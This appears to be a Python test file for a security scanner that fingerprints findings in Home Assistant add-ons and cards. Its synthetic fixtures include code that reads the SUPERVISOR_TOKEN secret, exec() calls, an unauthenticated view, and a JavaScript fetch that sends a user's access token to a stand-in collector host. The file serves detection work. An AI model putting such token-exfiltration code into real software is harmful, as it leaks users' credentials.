"""(0.14.0) Fingerprints hold while the flagged code is the same, wherever it moved, and
change when it changes. Synthetic code only; nothing is run."""

from __future__ import annotations

import textwrap

from sniff_test.report import fingerprint as fp

PY = textwrap.dedent(
    """\
    import os


    def helper():
        return 1


    def grab(hass):
        token = os.environ.get("SUPERVISOR_TOKEN")
        return token
    """
)


def _line(text: str, needle: str) -> int:
    return next(i for i, ln in enumerate(text.splitlines(), 1) if needle in ln)


def test_python_holds_when_code_moves_and_changes_when_it_changes():
    a = fp.python("r", PY, _line(PY, "SUPERVISOR_TOKEN"))
    moved = "# a new comment\n\n\n" + PY.replace("    return 1", "    return 2")
    assert fp.python("r", moved, _line(moved, "SUPERVISOR_TOKEN")) == a
    changed = PY.replace("return token", "return token.strip()")
    assert fp.python("r", changed, _line(changed, "SUPERVISOR_TOKEN")) != a
    assert fp.python("other-rule", PY, _line(PY, "SUPERVISOR_TOKEN")) != a


def test_python_314_except_without_brackets_parses_like_the_bracketed_form():
    new = "def f():\n    try:\n        x()\n    except ValueError, KeyError:\n        exec(y)\n"
    old = new.replace("except ValueError, KeyError:", "except (ValueError, KeyError):")
    assert fp.python("r", new, 5) == fp.python("r", old, 5)


def test_an_unparseable_file_hashes_whole():
    bad = "def f(:\n    exec(x)\n"
    assert fp.python("r", bad, 2) != fp.python("r", bad + "# more\n", 2)


def test_a_class_line_finding_hashes_the_whole_class():
    cls = textwrap.dedent(
        """\
        class View(HomeAssistantView):
            requires_auth = False

            async def get(self, request):
                return self.json({})
        """
    )
    a = fp.python("ha-unauth-view", cls, 1)
    assert fp.python("ha-unauth-view", cls.replace("json({})", "json({'x': 1})"), 1) != a


JS = 'function a(e,t){return fetch("/api/x/"+e,{headers:{Authorization:t.auth.data.access_token}})}'


def test_javascript_survives_a_minifier_renaming_locals_and_moving_code():
    start = JS.index("fetch")
    a = fp.javascript("card-token-exfil", JS, start, start + 5)
    renamed = "var q=1;\n" + JS.replace("(e,t)", "(n,o)").replace("+e,", "+n,").replace(
        ":t.", ":o."
    )
    s2 = renamed.index("fetch")
    assert fp.javascript("card-token-exfil", renamed, s2, s2 + 5) == a
    other_url = JS.replace("/api/x/", "https://collector.invalid/")
    s3 = other_url.index("fetch")
    assert fp.javascript("card-token-exfil", other_url, s3, s3 + 5) != a
    other_prop = JS.replace("access_token", "refresh_token")
    s4 = other_prop.index("fetch")
    assert fp.javascript("card-token-exfil", other_prop, s4, s4 + 5) != a


def test_a_dependency_finding_is_the_package_version_and_advisories():
    a = fp.dependency("dep-vuln", "lib@1.0 (npm): GHSA-1")
    assert a == fp.dependency("dep-vuln", "lib@1.0 (npm): GHSA-1")
    assert a != fp.dependency("dep-vuln", "lib@1.1 (npm): GHSA-1")
    assert a != fp.dependency("dep-vuln", "lib@1.0 (npm): GHSA-1, GHSA-2")
